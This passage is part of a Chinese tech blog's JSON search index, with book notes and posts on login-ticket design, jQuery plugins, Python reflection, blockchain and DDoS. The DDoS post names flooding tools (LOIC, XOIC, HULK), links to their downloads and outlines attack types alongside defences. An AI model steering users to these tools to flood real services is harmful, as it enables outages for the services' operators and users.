9787201100159\n","description":"","id":569,"section":"post","tags":["书籍","人生"],"title":"月亮和六便士","uri":"https://www.chenshaowen.com/blog/book/the-moon-and-sixpence.html"},{"content":"作者: 王小波\n出版社: 北方文艺出版社\n出版年: 2006-4\nISBN: 9787531719199\n","description":"","id":570,"section":"post","tags":["书籍","人生"],"title":"一只特立独行的猪","uri":"https://www.chenshaowen.com/blog/book/a-maverick-pig.html"},{"content":"作者: 李尚龙\n出版社: 中国友谊出版公司\n出版年: 2015-7\nISBN: 9787505735361\nNotes:\n比较适合迷茫的大学生看。作者从军校辍学，成为新东方英语老师，最后写剧本拍电影，通过自己的努力过着自己选择的生活。书中主要记录作者一路走过的历程、人生观、价值观，希望给予读者以启发。\n","description":"","id":571,"section":"post","tags":["书籍","人生"],"title":"你只是看起来很努力","uri":"https://www.chenshaowen.com/blog/book/you-just-look-very-hard.html"},{"content":"\nNote:\n简单说几句，组内同学的分享。App Engine 将开发从繁琐的部署、配置流程中解脱出来，提供全方位的自动化支持服务。其中的 Controller 是 App Engine 的大脑，协调控制整个引擎的运作。PPT 中主要讲的是 App Engine 的设计方案和演化过程，还对资源调度、故障容灾进行了考虑。\n由于其是微服务化的一个环节，需要配合其他微服务才能最大效用发挥，比如存储、登录认证等。\n","description":"","id":572,"section":"post","tags":["整理","PaaS","架构"],"title":"PaaS 平台 App Engine 2.0 介绍","uri":"https://www.chenshaowen.com/blog/app-engine-2-0.html"},{"content":" 平台目前包括多个子系统、多个版本，不同版本都是使用相同的运营系统。为了方便用户使用多个版本，我们需要绑定用户的QQ、微信帐号。此外，为了最大限度地防止由于某个登录系统故障而导致用户无法使用APP的情况，我们需要一个统一的帐号管理\u0026amp;登录服务。这个服务就是：【统一登录服务】。主要包括以下功能： 绑定用户的 QQ、微信, ,支持多种登录方式（QQ、微信）, 支持运维配置协作者QQ（代理游戏的开发商员工）,提供统一的登录页面 \u0026amp; REST API，支持 xx 域系统的接入\n1. 统一登录服务设计 统一登录服务为子系统提供统一的登录票据和票据验证方式，对子系统完全屏蔽第三方登录系统的接入差异。子系统接入蓝鲸统一登录服务后，则可实现QQ登录、微信登录，而不需要关心这两种登录方式的实现细节和接入流程；更重要的是，第三方登录系统变更时，只需要在统一登录服务上做变更，而子系统完全不需要做任何改动。\n在介绍具体细节之前，先看一下简化的统一登录服务的整体架构示意图：\n图1：统一登录服务架构示意图\n统一登录服务主要分为两部分：登录服务，账号管理服务。登录服务主要负责将第三方登录系统的登录票据转换为统一的登录票据，并维护票据信息，账号管理服务主要处理用户多个账号体系（QQ、微信）的映射关系。\n统一登录服务的核心数据是登录票据，难点是如何将登录票据跨域写入子系统的cookie中。本文先重点围绕这两部分展开。\n1.1 登录票据设计 第三方登录系统验证用户登录信息成功后，统一登录服务根据登录方式、用户id、登录时间戳等信息生成原始的登录票据（o_ticket）；原始登录票据（o_ticket）经过AES加密、Base64编码后生成统一的登录票据（bk_ticket）。\n1 2 3 4 # 原始登录票据 o_ticket = \u0026#39;登录方式｜用户id｜登录时间戳\u0026#39; # 统一登录票据 bk_ticket = urlsafe_b64encode(AES(o_ticket)) 1.2 跨域设计 大家都知道cookie是无法跨域写入的，蓝鲸统一登录服务是如何做到将登录票据写入不同域下的呢？详细的过程如下图所示：\n图2：登录票据写入cookie\n如上图所示，登录票据生成成功后，系统根据回调url判断子系统个跟域是否为 xx域，不是则重定向子系统所属的域下写入cookie。如回调url为：http://t.ob.com， 则重定向到 bklogin.ob.com，在 ob 域下写入 cookie 后再跳转到 http://t.ob.com。\n注：\n（1）统一登录服务目前支持 xx 域、ob 域和 tencent 域。\n（2）其他域下的子系统接入时，只需要申请域名：bklogin.targetdomin.com，并将其 cname 到 bklogin.xx.com 即可。\n2. 用户信息管理 统一登录服务不只是集成了多种登录方式，更重要的是提供了统一的帐号管理服务。如公司内部系统的接口都是以用户的rtx名称鉴权，而第三方云平台提供的API接口（如腾讯云API）是以用户的qq号进行鉴权，这就要求用户不管是以何种方式登录，统一登录服务都能正确地拿到其在不同账号体系中的身份信息。\n统一登录服务从用户系统中同步了用户的rtx名称、qq号、微信号，并将其存储在自己的用户信息表中。用户也可以在平台的个人中心中修改自己绑定的qq号和微信号。统一登录服务的用户信息表如下图所示：\n图3：用户信息表\n3. 系统接入 为方便系统接入，统一登录服务提供了统一的登录页面、简单登录框页面和REST API。此外，统一登录服务提供了前台js版的退出登录接口，系统可以在前台调用js方法清除统一登录的票据cookie后，再执行自己的退出登录逻辑。\n3.1 API接口 统一登录服务提供了REST API，包括后台接口和前端js接口。\n3.1.1 后台接口： 登录首页：http://login.o.xx.com?app_code=xx\u0026amp;c_url=http://xx.xx.xx 登录框页面：http://login.o.xx.com/plain?app_code=xx\u0026amp;c_url=http://xx.xx.xx 验证登录接口：http://login.o.xx.com/user/is_login?bk_ticket=xxxxxxxxx 用户基本信息接口：http://login.o.xx.com/user/get_info?bk_ticket=xxxxxxxxx 用户详细信息接口：http://login.o.xx.com/user/get_full_info?bk_ticket=xxxxxxxxx 用户权限接口：http://login.o.xx.com/user/get_user_right?bk_ticket=xxxxxxxxx 【返回参数说明】：\n参数名称 类型 说明 返回码 如果错误，返回错误信息 返回数据 【返回码说明】：\nret = 0: 正确返回\nret \u0026gt; 0: 用户传送的参数不正确\nret \u0026lt; 0: 系统内部错误，请联系【蓝鲸助手】处理\n【错误码说明】：\n错误码(ret) 含义说明 1000 没有登录票据 1001 登录票据不合法 1002 登录票据已过期 1003 用户信息不存在 -1 系统内部错误，请联系【助手】 3.1.2 前端js接口： 引用js：http://login.o.xx.com/static/js/bklogout.js\n退出登录方法：bk_logout.logout();\n3.2 接入流程 系统接入蓝鲸统一登录服务，只需要：登录页面接入、登录态校验、退出登录三个步骤。\n3.2.1 登录页面接入 统一登录服务提供了两种登录页面的接入方式：\n一种是完整的登录页面( http://login.o.xx.com )，如图4所示。 一种是简单的登录框页面( http://login.o.xx.com/plain )，该页面只包含最简洁的登录框，系统开发者可以很方便把它嵌入到系统自己的登录首页中，也可以做成弹出框的形式（针对用户进入系统后登录态失效的情况，这种方式对用户来说更友好，只需要弹出登录框来重新获取登录态，而不需要刷新页面），如图5所示。\n图4：登录页面\n图5:登录框页面 【参数说明】：\n参数名称 类型 说明 app_code str 接入系统id c_url str 登录成功后的回调链接 default_mode str 默认的登录方式，可选值为：qq、xx 3.2.2 登录态校验 从cookie中获取登录票据（bk_tciket）后,可以通过以下两种方式来进行登录态校验：\n方式1：调用/user/get_info 接口来验证登录态。用户进入系统时建议使用该接口，该接口即可验证登录态又可以获取登录用户的信息。 方式2：调用专门的登录态校验接口/user/is_login。 方式3：调用判断用户权限接口/user/get_user_right。后台admin系统接入时可以调用该接口判断用户权限(is_superuser:用户为该系统的超级管理员、is_staff：用户为该系统的普通管理员) 3.2.3 退出登录： 退出登录时，请按如下步骤调用接口清除登录态，请勿随意删除统一登录服务下发的有关cookie，以免造成用户登录出现问题。\n引入js脚本：http://login.o.xx.com/static/js/bklogout.js 调用退出登录接口：bk_logout.logout(callback); 1 2 3 4 5 6 7 8 9 10 function callback(status){ // 回调状态参数为2表示清除登录票据成功 if(status == 2){ // 你的退出登录逻辑 }else{ // 登出失败处理逻辑 } } // 清除登录票据操作，操作成功后回调callback方法 bk_logout.logout(callback); ","description":"","id":573,"section":"post","tags":["转载","服务"],"title":"统一登录服务","uri":"https://www.chenshaowen.com/blog/unified-login-service.html"},{"content":"作者: 罗纳德·F·布什 / 阿尔文·C·伯恩斯\n出版社: 中国人民大学出版社\n出版年: 2011-3-1\nISBN: 9787300133362\n","description":"","id":574,"section":"post","tags":["书籍","市场"],"title":"营销调研","uri":"https://www.chenshaowen.com/blog/book/marketing-research.html"},{"content":"作者: 时寒冰\n出版社: 上海财经大学出版社\n出版年: 2014-7-1\nISBN: 9787564219239\n","description":"","id":575,"section":"post","tags":["书籍","金融"],"title":"未来二十年，经济大趋势-现实篇","uri":"https://www.chenshaowen.com/blog/book/the-economic-trend-reality.html"},{"content":"作者: 时寒冰\n出版社: 上海财经大学出版社\n出版年: 2014-7-1\nISBN: 9787564219352\nNotes:\n作者对中国的债务、房产、人口、粮食进行了分形，对现况充满焦虑。还对地缘政治国家的经济政治形势进行了分形，阐述了美国美元的影响力，金融战的独孤求败，周边的俄罗斯、印度、越南、日本等国家与中国的博弈。总之，未来的二十年是危机四伏，但又充满机会的二十年。\n","description":"","id":576,"section":"post","tags":["书籍","金融"],"title":"未来二十年，经济大趋势-未来篇","uri":"https://www.chenshaowen.com/blog/book/the-economic-trend-future.html"},{"content":"1. jQuery特征 jQuery消除了浏览器的兼容问题 遍历DOM树、选择元素 大量的插件库 工具函数库，$.type()、$.extent()等 jQuery的核心函数，通常指的是一个工厂对象，即jQuery()函数，或者更为常用的别名$()函数。\njQuery除了jQuery和$之外，不会污染全局名称空间。\njQuery插件的命名：\n通常采用jquery.pluginName.js命名，min版也采用与之类似的命名规范jquery.pluginName.min.js\n2. jQuery扩展方式 2.1 jQuery函数prototype属性的别名（jquery.fn）进行扩展 fn/prototype 是实时的。无论何时，新增的属性和方法，任何从该类型创建的对象都可以立即访问这些属性和方法。\n1 2 3 jQuery.fn.newFunction = function(){ console.log(\u0026#34;This is a simple case\u0026#34;); } 2.2 jQuery.extend() 方法 $.extend方法最基本的功能是合并两个对象。调用 $.extend方法时，如果只传入一个参数，那么该参数将被合并到jQuery中。\n1 2 3 4 5 jQuery.extend({ newFunction:function(){ console.log(\u0026#34;This is a simple case\u0026#34;); } }); 2.3 jQuery UI Widget Factory 扩展 Widget Factory是一个jQuery方法，接受两个或者三个参数：第一个参数是名称空间，第二个参数是一个已有的widget原型，它将从该原型继承，第三个参数是可选的对象字面量，作为新widget原型。\n1 jQuery.widget(\u0026#39;namespace.newFunction\u0026#39;,{}); 3. 需要关注的地方 this。在jQuery插件的上下文中，this指的是jQuery本身，而不是当前操作的DOM。唯一的例外是$.each循环体内，this才指向DOM。 确保$指向jQuery。(function($){ })(jQuery)。 不要省略分号。 避免最小化时，异常。 尽可能返回jQuery对象，支持链式语法。 4. 最佳实践 使用jQuery插件模式 在只为插件声明单个名称，对外暴露唯一接口 插件只接受一个Options参数 ","description":"","id":577,"section":"post","tags":["博文","前端","JavaScript","Demo"],"title":"jQuery插件开发","uri":"https://www.chenshaowen.com/blog/plugin-development-of-jquery.html"},{"content":"英文名：Professional jQuery\n作者: [美] 奥特罗，[美] 劳伦斯\n出版社: 清华大学出版社出版\n译者: 施宏斌\n出版年: 2013-04\nISBN: 9787302317845\n","description":"","id":578,"section":"post","tags":["书籍","JavaScript"],"title":"jQuery高级编程","uri":"https://www.chenshaowen.com/blog/book/professional-jquery.html"},{"content":"作者: 道格拉斯•W•哈伯德\n副标题: 大数据时代,《财富》500强都在使用的量化决策法\n出版社: 世界图书出版公司\n译者: 邓洪涛\n出版年: 2013-09-01\nISBN: 9787510067327\nNote:\n量化是用来减少不确定性，而不是消除。\n量化关键在于要弄清楚要量化什么，以及被量化的事物为什么重要。\n量化的目的会给我们提供真正要量化什么以及该如何量化的线索。\n要明确量化的价值，能提供怎样的决策辅助，否则都是徒劳无功。\n","description":"","id":579,"section":"post","tags":null,"title":"数据化决策","uri":"https://www.chenshaowen.com/blog/book/data-decision-making.html"},{"content":"作者: [美]纳西姆•尼古拉斯•塔勒布\n副标题: 从不确定性中获益\n原作名: Antifragile: Things That Gain from Disorder\n出版社: 中信出版社\n出版年: 2014-01-01\nISBN: 9787508643335\n","description":"","id":580,"section":"post","tags":["书籍","金融","博弈"],"title":"反脆弱","uri":"https://www.chenshaowen.com/blog/book/antifragile-things-that-gain-from-disorder.html"},{"content":"作者: Mark Pilgrim\n出版社: Apress\n出版年: 2004-07-19\nISBN: 9781590593561\n","description":"","id":581,"section":"post","tags":["书籍","Python"],"title":"Dive Into Python","uri":"https://www.chenshaowen.com/blog/book/dive-into-python.html"},{"content":"1. 什么是 DDoS 举个栗子，春节买票期间，高铁票一出，全国人民都向12306的服务器发送连接请求。然后，12306的服务器就会不响应或者较慢响应网页请求。这就构成了一次DDoS攻击。通过大量并发的请求，迫使目标服务受到影响，甚至终止。\nDDoS攻击是通过利用服务器上的漏洞，或者消耗服务器上的系统资源(内存、硬盘等)、应用资源（连接表等）来达到目的。能发动DDoS攻击的不只有僵尸网络，专业的DDoS工具也可以进行DDoS攻击。 DDoS相对于DoS攻击，主要体现在分布式上。DDoS常常不是由一个主机发起，而是由大批量的主机同时发起，比如一个僵尸网络。这种方式，模拟正常的访问请求，给防御DDoS攻击增加了不少难度。而近年来，随着DDoS攻击的工具化，僵尸网络越来越大而多，不少著名企业遭受了DDoS攻击。\n2. DDoS常用工具 2.1 Hping、PenTBox和Zarp Hping常用功能包括网络压力测试、防火墙测试、端口扫描。 PenTBox主要是帮组安全人员对网络、系统的安全性和稳定性进行测试，提供密码算法工具、网络工具（压力测试、溢出攻击），web安全测试工具。 Zarp是采用Python编写的开源网络攻击测试集成工具，集多种嗅探、DoS攻击压力测试于一身。 2.2 卢瓦(LOIC) LOIC，低轨道离子炮是一个最受欢迎的DOS攻击工具。 这个工具被去年流行的黑客集团匿名者用于对许多大公司的网络攻击。 下载卢瓦LOIC: http://sourceforge.net/projects/loic/\n2.3 XOIC XOIC是另一个不错的DOS攻击工具。它根据用户选择的端口与协议执行DOS攻击任何服务器。XOIC开发者还声称XOIC比上面的LOIC在很多方面更强大呢。\n一般来说,该工具有三种攻击模式,第一个被称为测试模式，是非常基本的； 第二个是正常的DOS攻击模式； 最后一个是带有HTTP / TCP / UDP / ICMP消息的DOS攻击模式。 下载XOIC: http://sourceforge.net/projects/xoic/\n2.4 HULK HULK是另一个不错的DOS攻击工具，这个工具使用某些其他技术来避免通过攻击来检测。它有一个已知的用户代理列表，且使用的是随机请求。在这里下载HULK: http://packetstormsecurity.com/files/112856/HULK-Http-Unbearable-Load-King.html\n3 DDos攻击的分类 3.1 FLOOD攻击 ICMP FLOOD。ICMP是TCP/IP协议族的核心协议之一。它用于在TCP/IP网络中发送控制消息，提供可能发生在通信环境中的各种问题反馈。攻击者使用受控主机向被攻击目标发送大量的ICMP/IGMP报文，进行洪水攻击以消耗目标的带宽资源。现在这种方法已不多见，被攻击目标可以在其网络边界直接过滤并丢弃ICMP/IGMP数据包使攻击无效化。 UDP FLOOD。UDP是一种面向无连接的传输层协议，主要提供面向事务的简单不可靠信息传送服务。攻击者通过向目标发送数据包，以消耗宽带资源达到目标。有两种数据包，小包UDP64字节大小，能够增大网络设备处理数据包的压力，造成处理速度的缓慢和传输延等拒绝服务的效果。大包是指1500字节以上的数据包，超过以太网最大传输单元。大包，能有效占用网络接口的传输宽带，迫使攻击目标接收到UPD数据时，进行分片重组，拥塞网络，延迟服务器响应。 TCP FLOOD。TCP是一种面向连接的、可靠的、基于字节流的传输层通信协议。攻击者，发送大量TCP连接占满攻击目标的连接表，从而迫使目标拒绝服务，以此达到目的。 SYN FLOOD。不断向服务器发送连接请求（TCP SYN请求），速度高达每秒150次。服务器忙于应对这些请求，从而无法回应正常的用户。此外，攻击者还可以采用随机伪造源地址的方式。一方面，这使得攻击来源难以追踪；另一方面，随机的源地址也使得过滤和阻断攻击变得非常困难。SYN攻击，占据DDoS攻击的三分之一以上。 RST FLOOD。这种方式，借助于TCP连接是通过带有FIN标识报文的四次握手来切断客户端与服务器的TCP连接的。但是，一旦出现意外，无法完成四次握手，就会使用RST报文来强制中断。RST攻击，就是通过伪造带有RST标识位的TCP报文，强制中断客户端与服务器的TCP服务的。 SSL FLOOD。SSL攻击的方式主要是消耗攻击目标的CPU资源，以此迫使目标停止响应。攻击者在进行SSL连接并握手之后，不断地进行秘钥重新协商过程。 HTTP FLOOD。攻击者利用大量的受控主机不断地向Web服务器恶意发送大量HTTP请求，要求Web服务器处理，占用服务器资源。造成其他用户无法得到响应。 3.2 反射攻击 采用通常的FlooD攻击，攻击源可以被定位。反射攻击的方式是通过修改数据包（通常是UPD，ACK等，无需握手认证的包）源IP实现的。首先向受控主机发送大量数据包，目的IP为反射器（服务器、路由器等网络设备），源IP地址为攻击目标的IP。反射器收到数据包，以为攻击目标请求数据，于是返回大量数据响应，消耗攻击目标的宽带资源。\n3.3 放大攻击 放大攻击的思路是，发送较小的数据请求包m，返回较大的响应数据包M，从而成倍的消耗攻击目标的宽带资源，放大倍率size(M)/size(m)。常见的有DNS放大攻击，攻击者发送DNS的查询请求包只有60字节左右，而返回的响应包却高达3000字节，可以获得放大50倍的效果。相同的，还有NTP放大攻击，发送时间同步请求。\n3.4 Sockstress 攻击 Sockstress在客户端与服务器建立连接后，设置TCP窗口大小为0，或者一个很小的值。攻击目标会不断探测客户端TCP窗口变化，以此保存连接，消耗连接表。从而达到拒绝服务的目的。\n3.5 慢速攻击 慢速攻击采取的策略是，长期占用连接资源，以此消耗目标的应用资源。POST\n4. 预防的手段 由于DDoS分布式的特点，很难通过单一特征识别出，发起攻击的主机。防御DDoS攻击可以采取多种方法并行的方式，会有较好的效果。DDoS的防御主要分为三个部分，一个DNS，一个是网络，一个是应用。由于现在DNS主要依靠第三方，针对DNS服务器的攻击影响甚广，第三方DNS服务商常常都非常重视DDoS攻击，做了充足准备。针对网络的攻击，主要是消耗网络带宽。还有一种是针对应用服务器，这种攻击主要是消耗服务器的CPU、内存、数据库连接数等软硬件资源，来达到目的。\nCDN\n可以保证静态页面不受影响。在页面中，绑定单独域名，通过CDN网络分发静态文件，可能是个不错的选择。能显著提高并发请求量。如果可以的话，将主页设置为静态页面，可以显著提高抗DDoS攻击的能力。 拼带宽\n由于大部分的DDoS具有时间短、流量大的特点，在爆发DDoS的时间段，可以动态的购买大量的带宽，以增加宽带对抗攻击。花费一定数量的钱，避免企业形象受损、提供持续服务，是件性价比不错的事。 流量清洗\n检查访问请求的一些信息，通过设置过滤条件，有选择性的服务。比如，屏蔽掉某些IP的访问。 负载均衡\n将不同的访问来源，分发到不同的服务器上，以此增强服务的可用性。 AnyCast\nAnycast技术是一种网络寻址和路由方法。通过使用Anycast, 一组提供特定服务的主机可以使用相同的 IP地址, 同时,服务访问方的请求报文将会被IP网络路由到这一组目标中拓扑结构最近的一台主机上。几乎全部的互联网根域名服务器都部署了Anycast。使用 Anycast技术能够稀释分布式拒绝服务攻击流量, 在Anycast寻址过程中. 流量会被导向网络扑结构上最近的节点, 在这个过程中, 攻击者并不能对攻击流量进行操控,因此攻击流量将会被分散并稀释到最近的节点上,每一个节点上的资源消耗都会减少,因为高防服务器主要是作用在节点上,通过这样的设计能够有效降低高防服务器的压力。 5. 参考 https://en.wikipedia.org/wiki/Denial-of-service_attack ","description":"","id":582,"section":"post","tags":["博文","网络","安全","DDoS","入门"],"title":"DDoS 攻击入门","uri":"https://www.chenshaowen.com/blog/ddos-101.html"},{"content":"1. 应用场景 通过配置文件，控制程序运行时的流程。配置文件中常保存的是，字符串，而不是对象 调试程序时，查看对象的全部属性值 动态模块的导入 对于第一种场景，广泛被采用的是反射。在Java的很多框架中都使用了反射机制，Python实现的Web框架Django中，也有应用。比如url的路由。第二种场景，手动添加输出某个对象object类的属性值，非常的麻烦，而且不全。这时，可以使用dir(object）列出全部属性，然后使用反射来访问。第三中场景，通过反射也能实现。\n2. Python的反射 通过反射，可以将字符串和对象的属性关联起来。通过dir(object)，可以查看对象obejct的属性列表。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 # -*- coding: utf-8 -*- class Person: \u0026#39;\u0026#39;\u0026#39; Python反射的一个举例 \u0026#39;\u0026#39;\u0026#39; count = 0 def __init__(self, name=\u0026#34;none\u0026#34;, salary=\u0026#34;0\u0026#34;): self.name = name self.salary = salary Person.count += 1 def getName(self): print \u0026#34;i am in getName() function\u0026#34; return self.name \u0026gt;\u0026gt;\u0026gt; p = Person(name=\u0026#34;csw\u0026#34;) \u0026gt;\u0026gt;\u0026gt; dir(p) [\u0026#39;__doc__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;count\u0026#39;, \u0026#39;getName\u0026#39;, \u0026#39;name\u0026#39;, \u0026#39;salary\u0026#39;] \u0026gt;\u0026gt;\u0026gt; hasattr(p, \u0026#39;count\u0026#39;) True \u0026gt;\u0026gt;\u0026gt; getattr(p, \u0026#39;count\u0026#39;) 1 \u0026gt;\u0026gt;\u0026gt; getattr(p, \u0026#39;getName\u0026#39;)() i am in getName() function csw \u0026gt;\u0026gt;\u0026gt; setattr(p, \u0026#39;ModifiedName\u0026#39;, \u0026#39;name\u0026#39;) None \u0026gt;\u0026gt;\u0026gt; delattr(p, \u0026#39;name\u0026#39;) None \u0026gt;\u0026gt;\u0026gt; dir(p) [\u0026#39;ModifiedName\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;count\u0026#39;, \u0026#39;getName\u0026#39;, \u0026#39;salary\u0026#39;] \u0026gt;\u0026gt;\u0026gt; getattr(p, \u0026#39;getName\u0026#39;)() AttributeError: Person instance has no attribute \u0026#39;name\u0026#39; 2.1 getattr 方式：getattr(object,‘name‘,‘default’)\n说明：如果存在name的属性方法，则返回name的属性方法，否则返回default的属性方法。\n2.2 hasattr 方式：hasattr(object, ’name‘)\n说明：判断对象object是否包含名为name的属性方法，存在则返回True，否则返回False。hasattr是通过调用getattr(ojbect, ’name‘)是否抛出异常来实现）。\n2.3 setattr 方式：setattr(object,‘name’,’default‘)\n说明：设置对象object的name属性值为default,如果没有name属性，那么创建一个新的属性。\n2.4 delattr 方式：delattr(object,’name’)\n说明：删除对象object的name属性值。\n3. Python的反射实现 globals( )函数返回字典{ key:value }，key是对象的名称，value是对象的实例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026gt;\u0026gt;\u0026gt; globals() {\u0026#39;__builtins__\u0026#39;: \u0026lt;module \u0026#39;__builtin__\u0026#39; (built-in)\u0026gt;, \u0026#39;__file__\u0026#39;: \u0026#39;E:/code/lab/python-reflection/exapmle.py\u0026#39;, \u0026#39;__package__\u0026#39;: None, \u0026#39;Person\u0026#39;: \u0026lt;class __main__.Person at 0x00215FB8\u0026gt;, \u0026#39;__name__\u0026#39;: \u0026#39;__main__\u0026#39;, \u0026#39;__doc__\u0026#39;: None} \u0026gt;\u0026gt;\u0026gt; import test {\u0026#39;__builtins__\u0026#39;: \u0026lt;module \u0026#39;__builtin__\u0026#39; (built-in)\u0026gt;, \u0026#39;__file__\u0026#39;: \u0026#39;E:/code/lab/python-reflection/exapmle.py\u0026#39;, \u0026#39;__package__\u0026#39;: None, \u0026#39;Person\u0026#39;: \u0026lt;class __main__.Person at 0x02045FB8\u0026gt;, \u0026#39;test\u0026#39;: \u0026lt;module \u0026#39;test\u0026#39; from \u0026#39;D:\\Python2711\\lib\\test\\__init__.pyc\u0026#39;\u0026gt;, \u0026#39;__name__\u0026#39;: \u0026#39;__main__\u0026#39;, \u0026#39;__doc__\u0026#39;: None} \u0026gt;\u0026gt;\u0026gt; globals()[\u0026#39;test\u0026#39;] \u0026lt;module \u0026#39;test\u0026#39; from \u0026#39;D:\\Python2711\\lib\\test\\__init__.pyc\u0026#39;\u0026gt; 在执行 import test之后，可以看到新增了 test 的 key。可以利用这一点实现类似 Java 中，Class.forName（）的功能。但是这种方法，使用之前必须先 import，否则会抛出异常。\nPython中提供了 __import__（\u0026ldquo;functionName\u0026rdquo;）函数，传入参数“functionName”，就可以导入functionName模块。然后结合getattr函数进行相关的调用。\n4. 为什么不直接用 exec和eval 熟悉python的同学应该知道，exec和eval语句，也可以用来执行储存在字符串或文件中的Python语句。\n比如：\n1 2 3 4 \u0026gt;\u0026gt;\u0026gt; eval(\u0026#39;2*3\u0026#39;) 6 \u0026gt;\u0026gt;\u0026gt; eval(\u0026#34;2+3\u0026#34;) 5 那么为什么还要反射呢？使用exec和eval能够实现相同的功能，但是反射是一种编程方法、是设计模式的体现。反射凝聚了高内聚、低耦合的软件设计思想，不能简单的使用执行字符串的函数替代。\n","description":"","id":583,"section":"post","tags":["博文","Python","Demo"],"title":"Python的反射：getattr","uri":"https://www.chenshaowen.com/blog/reflection-of-python.html"},{"content":"副标题: 让学习过程变得积极愉悦的成人培训新方法\n作者: [美] Harold D.Stolovitch Erica J.Keeps\n出版社: 企业管理出版社\n出版年: 2012-1\nISBN: 9787802558861\nNote:\n主要论述了交互式培训能达到十分好的培训效果，分析了培训学习过程和心理，提出了四种培训的方法和一些建议。\n培训的目标是，以学习者为中心，以绩效为基础。以培训师为中心和以内容为基础必然导致对信息单向的灌输和传播。\n信息传播的有效性并不由信息的载体决定，而是取决于信息组织和设计的方式。\n不要在意使用的信息载体，而应专注于采用了何种改变学习者的互动形式。\n短期记忆大约维持10-15秒。容纳5-9条信息。信息的大小取决于学习者之前的结构。\n视觉化的方式把信息罗列出来，可以帮助学习者看到事物之间的联系。\n专家将程序性知识转化为陈述性知识输出，然后，学习者将陈述性知识转化为程序性知识。\n补充学习者缺乏的能力、知识和动机，营造和控制学习的氛围，为其提供反馈和成功的褒奖。\n成年人对知识需要的态度决定了他们的学习效果。\n不要考试，多给学习者参与的机会，请他们与大家分享自己的观点、建议、解决方案、信息和示例。\n","description":"","id":584,"section":"post","tags":["书籍","培训","思考"],"title":"交互式培训","uri":"https://www.chenshaowen.com/blog/book/the-interactive-training.html"},{"content":"1. 社会是如何靠信用运作起来的 首先我们来做一个问答：\n@ask:为什么你用一张卡片就能乘坐公交？\n@answer:我充了钱啊\n@ask:钱？那你哪里来的钱\n@answer:每个月的工资啊\n@ask:公司为什么每个月要给你发工资？\n@answer:签了合约的，我每个月上班，公司每个月给我发工资\n@ask:那公交公司为什么更愿意你刷卡，还给折扣，而不是现金支付？\n@answer:方便呗\n@ask:最后一个问题，公交公司为什么愿意接受你给的钱，我指的是，纸张或者数字？\n@answer:他们可以去购买其他东西，给员工发工资，给股东分红呗。你问的都是什么奇怪问题，这不都是显而易见的嘛。\n在我们习以为常的生活中，处处都流通着货币和信用，而货币的本质又是信用。可以说，现代社会是依靠信用运作起来的。央行发行的纸张，作为一种交换支付的媒介，其本身并不具备任何价值。但是有国家意志作为背书，人们才愿意接受支付。公交公司，通过提供乘车服务，获取乘客的报酬。但是一个大公司能够运作起来，通常不是仅靠自有资金，而是通过融资。原本只能购买100辆车的公交公司，通过融资购买了200辆，提高了服务的覆盖范围，让更多的人愿意乘公交。公交公司收入得到了增长，融资机构也拿到了一定的报酬，双赢。但为什么融资机构愿意借钱给公交公司？因为信用。就如同你愿意每个月上班，公司愿意每个月给你发工资一样，彼此之间通过信用达成契约。\n继续思考。为什么公交公司更愿意人们刷卡，而不是现金？不错，刷卡可以少雇佣清理现金的人员、避免假币。说白了，就是了降低运营的成本。成本！那公交公司融资需不需要成本呢？当然是必要的，进行一次融资不是发一个公告说，“本公司需要扩展业务，有钱的赶快来投钱，每年20%的分红”。这是不够的，而且不合法。在融资的过程中不仅需要大量金融人士参与，还需要法律、公关、文案等人员参与。这些都是融资的成本。将一家公司运作起来，成本就更高了。\n如果我们能够找到一种降低信用成本的方法，是不是有更多的人愿意开公司，是不是会有更多的融资发生？会的。整个社会的经济也会随着活跃起来。而这种方法已经出现，那就是区块链技术。传统的方式是通过法律规范信用行为，现在通过区块链技术，可以利用技术来规范行为。\n在过去的几个世纪里，经历了工业革命，铁路革命，石油革命。每一次的改变，都带来了全新的能源形式，同时影响了社会的组织方式。其特征是，显著降低成本，全新的通信方式，改变基础设置和逻辑。改变现有思想，并用新的取代之是一个巨大的转变过程，需要新的技能、能力和知识，从而从根本上改变企业的运作方式。区块链技术参与一些相关领域潜在革命创新：数字革命、分布式开发和透明的记录保存、不分等级的网络系统、密码学和软件工程，降低流程带来的成本。\n2. 比特币 特币的成功让区块链技术名声大噪。实际上比特币的三项关键技术，非对称加密、点对点技术、哈希现金，早已有之，并非其独创。比特币的突破之处在于，将已有的技术通过创新的方式组合起来，以一种让人们能接受的方式运作。比特币能够转移给任何拥有比特币钱包的人。这给非法交易提供了支付的渠道，也是监管机构不愿看到的抗审查性。\n比特币不受任何中心机构控制，交易需要全网公开确认，算法面前人人平等，每个人和每个节点都可以参与和监督。正是它的去中心化，才和所有其他的虚拟货币产生了本质区别，后来山寨币之类的虚拟货币，如仍然是由发行者控制的币种，最终都很难发展。区块链算法让比特币的交易可以在区块里面集中起来，并通过密码学前面添加到现有区块组成的。链里面。任何人都可以通过解决生产新区块所需的密码学难题从而添加一个包含交易的区块。\n传统的央行必须让人信任它不会让货币贬值，银行必须让人信任它能管理好钱财，并让这些财富以电子货币形式流通，但历史上，让央行承诺不贬值、银行不用货币来制造信贷泡沫，使得私人财富缩水，这是不可能的。但是比特币做到了，通过密码学难题将比特币的数量限制在2100W。\n2.1 发展历史 2008年的11月1日，塞托西·中本聪（Satoshi Nakamoto）在 “密码学邮件组” 里发了一个新帖：“我正在开发一种新的电子货币系统，采用完全点对点的形式，而且无需第三方信托机构”。随后，详细的回答了密码组成员的所有疑问，在白皮书中提出了一个可行的方案。\n2009年的01月03日，也就是两个月之后， 中本聪发布了开源的第一版比特币客户端，宣告了比特币的诞生。他同时通过“挖矿”得到了50枚比特币，产生第一批比特币的区块就叫“创始区块”（Genesis 